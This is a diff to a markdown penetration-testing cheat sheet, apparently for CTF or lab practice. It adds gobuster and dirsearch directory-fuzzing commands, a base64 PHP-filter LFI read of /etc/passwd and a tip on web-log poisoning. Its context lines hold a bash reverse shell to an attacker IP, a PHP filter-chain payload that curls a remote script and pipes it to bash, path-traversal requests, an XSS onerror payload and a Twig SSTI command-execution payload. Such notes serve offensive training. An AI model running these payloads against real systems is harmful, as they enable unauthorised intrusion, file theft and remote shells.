@@ -41,8 +41,11 @@ Enumeration
 ### Web Directory Fuzzing
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400 -fs 0`
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0`
+- `gobuster dir -e -u http://xxxxxx.xxx -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`
+- `dirsearch -u http://$IP` - It's important to run dirsearch without a wordlist option first as well as it includes options not commonly found in wordlists then use a wordlist of your choosing after `dirsearch -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/big.txt`
 ### Web File Fuzzing
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://xxxxxx.xxx/assets/FUZZ -fc 404,400 -fs 0 -e html,php,txt,bak,old`
+- `gobuster dir -k -u http://xxxxxx.xxx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,txt,jpg,jpeg,gif,sh,cgi,pl`
 ### Web Parameter Fuzzing for Host Command Injection
 - `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://xxxxxx.xxx/assets/index.php?FUZZ=id -fc 404,400 -fs 0`
 ### VHost Fuzzing
@@ -182,12 +185,15 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
 - If you notice a parameter using PHP filters there's a chance it may be susceptible to RCE via filter chaining. Example URL `/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
 - https://github.com/synacktiv/php_filter_chain_generator tool could be used to exploit it as follows:
   - First create a shell script named "revshell" on your local machine with the following contents, inserting your attacker machine IP address `bash -i >& /dev/tcp/x.x.x.x/4444 0>&1`
-  - Use the aforementioned tool to create a chain payload, inserting your attacker machine IP address ```python3 php_filter_chain_generator.py --chain '<?= `curl -s -L x.x.x.x/revshell|bash` ?>``` (`<?= ?>` is shorthand for `<?php echo ~ ?>`)
+  - Use the aforementioned tool to create a chain payload, inserting your attacker machine IP address ```python3 php_filter_chain_generator.py --chain '<?= `curl -s -L x.x.x.x/revshell|bash` ?>'```
+    (`<?= ?>` is shorthand for `<?php echo ~ ?>`)
   - Start a web server to host the revshell script and also start a netcat listener on the port specified in revshell
   - Execute the payload by requesting the following URL (the above vulnerable parameter has been used as an example) `/secret-script.php?file=<generated_chain>`
 #### LFI
 - LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
 - You can use a tool such as Burp Intruder to automate brute forcing of sensitive files on Linux if necessary. Example top line of the request in Intruder `GET /script.php?page=..//..//..//etc/passwd HTTP/1.1` Modify this to have the payload markers around etc/passwd and add in a suitable wordlist into the payload section (https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+- You can use a base64 encoding method to retrieve the contents of files via LFI `http://xxxxxx.xxx/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc//passwd`
+- ** Any time you find LFI, you should check for web access log poisoning (Logging of the user agent for example in the web access log which you can access via LFI can then be exploited by putting a payload in the user agent header which inserts it into the web access log, then you access the log file via LFI to execute the payload) **
 ### SSTI
 - On Twig version 2.14.0 or below with the sandbox mode enabled `{{['id',""]|sort('passthru')}}`
 ### Databases
